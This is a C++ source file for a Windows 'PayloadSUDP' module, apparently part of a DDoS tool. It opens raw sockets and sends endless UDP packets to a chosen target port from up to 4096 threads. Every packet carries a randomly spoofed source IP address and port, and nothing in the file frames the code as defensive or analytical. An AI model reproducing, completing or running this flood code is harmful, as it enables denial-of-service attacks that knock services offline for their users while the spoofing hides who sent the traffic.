#include "PayloadSUDP.h"

#define MAX_PACKET_SIZE 4096

#define PHI 0x9e3779b9




void PayloadSUDP::init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++)
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t PayloadSUDP::rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

char *PayloadSUDP::myStrCat(char *s, char *a) {
	while (*s != '\0') s++;
	while (*a != '\0') *s++ = *a++;
	*s = '\0';
	return s;
}


char * PayloadSUDP::replStr(const char * str, size_t count)
{
	char *str2 = (char *)str;
	if (count == 0) return NULL;
	char *ret = (char *)malloc(strlen(str2) * count + count);
	if (ret == NULL) return NULL;
	*ret = '\0';
	char *tmp = myStrCat(ret, str2);
	while (--count > 0) {
		tmp = myStrCat(tmp, str2);
	}
	return ret;
}

/* function for header checksums */



unsigned short PayloadSUDP::csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}
void PayloadSUDP::setup_ip_header(iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(iphdr) + 1028;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;

	// Initial IP, changed later in infinite loop
	iph->saddr = inet_addr("192.168.3.100");
}

void PayloadSUDP::setup_udp_header(udphdr * udph)
{
	udph->source = htons(5678);
	udph->check = 0;
	char *data = (char *)udph + sizeof(udphdr);
	data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256);
	udph->len = htons(1028);
}

void PayloadSUDP::flood(void * par1)
{
	thread_data *td = (thread_data *)par1;
	fprintf(stdout, "Thread %d started\n", td->thread_id);
	char datagram[MAX_PACKET_SIZE];
	iphdr *iph = (iphdr *)datagram;
	udphdr *udph = (udphdr *)iph + sizeof(iphdr);
	//	struct iphdr *iph = (struct iphdr *)datagram;
	//	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	sockaddr_in sin = td->sin;
	char new_ip[sizeof "255.255.255.255"];
	SOCKET s;
	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (s < 0) {
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	unsigned int floodport = td->floodport;

	// Clear the data
	memset(datagram, 0, MAX_PACKET_SIZE);

	// Set appropriate fields in headers
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->dest = htons(floodport);

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
	int tmp = 1;
	int optval = 1;
	//const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&optval, sizeof optval) < 0) {
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	int throttle = td->throttle;

	uint32_t random_num;
	uint32_t ul_dst;
	init_rand(time(NULL));
	if (throttle == 0) {
		while (1) {
			sendto(s, datagram, iph->tot_len, 0, (sockaddr *)&sin, sizeof(sin));
			random_num = rand_cmwc();

			ul_dst = (random_num >> 24 & 0xFF) << 24 |
				(random_num >> 16 & 0xFF) << 16 |
				(random_num >> 8 & 0xFF) << 8 |
				(random_num & 0xFF);

			iph->saddr = ul_dst;
			udph->source = htons(random_num & 0xFFFF);
			iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
		}
	}
	else {
		while (1) {
			throttle = td->throttle;
			sendto(s, datagram, iph->tot_len, 0, (sockaddr *)&sin, sizeof(sin));
			random_num = rand_cmwc();

			ul_dst = (random_num >> 24 & 0xFF) << 24 |
				(random_num >> 16 & 0xFF) << 16 |
				(random_num >> 8 & 0xFF) << 8 |
				(random_num & 0xFF);

			iph->saddr = ul_dst;
			udph->source = htons(random_num & 0xFFFF);
			iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

			while (--throttle);
		}
	}
}
void PayloadSUDP::init()
{
	//Setting up Sockets...
	WSADATA wsock;
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsock) != 0)
	{
		fprintf(stderr, "WSAStartup() failed");
		exit(EXIT_FAILURE);
	}
	printf("Initialised successfully.");
	////////////////////////////////////////////////
	const int time = PayloadSUDP::lTime;
	int num_threads = PayloadSUDP::threads;
	if (num_threads > 4096)
		num_threads = 4096;
	unsigned int floodport = PayloadSUDP::port;
	thread dthread[4096];
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = address;

	struct thread_data td[4096];

	int i;
	for (i = 0; i < num_threads; i++) {
		td[i].thread_id = i;
		td[i].sin = sin;
		td[i].floodport = floodport;
		td[i].throttle = 0;
		//std::function<void(int)> callback = std::bind(flood, &td[i]);
		dthread[i] = std::thread(&PayloadSUDP::flood, this, (void *)&td[i]);
	}
	//Starting Flood...
	if (time > 0)
	{
		Sleep(time);
	}
	else {
		while (1) {
			Sleep(1);
		}
	}
}
